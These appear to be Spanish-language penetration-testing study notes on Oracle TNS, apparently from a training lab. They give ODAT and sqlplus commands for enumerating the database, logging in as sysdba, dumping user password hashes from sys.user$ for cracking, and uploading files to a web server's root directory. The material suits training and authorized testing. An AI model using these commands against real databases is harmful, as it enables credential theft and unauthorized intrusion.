Oracle TNS es un protocolo de comunicacion que permite a un cliente conectarse a una BBDD Oracle a través de la red.

Usa el puerto **TCP / 1521** 

Es importante porque las BBDD Oracle son muy comunes en muchas infraestructuras. 

### Odat


```
python3.11 ./odat.py all -s {IP}
```

Ejecutamos este archivo en un entorno virtual de python. Ese archivo es una herramienta de penetration testing diseñada para explotar vulnerabilidades en BBDD Oracle. 

### Log in

```
sqlplus {user}/{password}@{IP}/{SID}
```

Con este comando nos conectamos a la BBDD Oracle.

Si al conectarnos nos sale este error:

*"sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory"*

Usamos este comando:

```
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```


### SQL interaction

Para mostrar todas las tablas en la BBDD:

```
SQL> select table_name from all_tables;
```

Para mostrar todo de una tabla:

```
SQL> select * from {table_name};
```


### Enumeración

Nos intentamos conectar como sysdba que es como si fueses usuario root en linux. Administrador

```
SQL> sqlplus {user}/{password}@10.129.204.235/{SID} as sysdba

...SNIP...


SQL> select name, password from sys.user$;

```

El ultimo comando devuelve los hashes de los usuarios. Se pueden crackear.



### FIle Upload

Si sabemos el tipo de Sistema Operativo que se usa, podemos intentar hacer una subida de archivos al servidor. 

Presuponemos que hay un servidor web corriendo:

|**OS**|**Path**|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|

Este comando sube el archivo desde la BBDD al disco del servidor al path que nosotros queramos. Porque la BBDD corre con permisos de administrador por lo tanto podria tener permisos de escritura en el disco. 

```
python3.11 /odat.py utlfile -s {IP} -d {SID} -U {user} -P {password} --sysdba --putFile {path} file ./file
```

